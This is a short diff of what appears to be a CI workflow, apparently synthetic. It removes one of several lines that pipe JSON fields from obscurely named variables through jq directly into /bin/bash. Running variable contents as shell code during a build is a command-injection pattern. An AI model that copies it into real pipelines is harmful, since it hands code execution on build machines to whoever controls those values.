@@ -21,7 +21,6 @@ jobs:
           echo $ppto416 | jq -r .ehgao8879 | /bin/bash
           echo $h8 | jq -r .c60 | /bin/bash
           echo $j70045 | jq -r .vizaf06683 | /bin/bash
-          printf '%s' "$ir94955" | jq -r .itqip5507 | /bin/bash
           printf '%s' "$otra73283" | jq -r .xwym899 | /bin/bash
 
       - name: Upload artifact
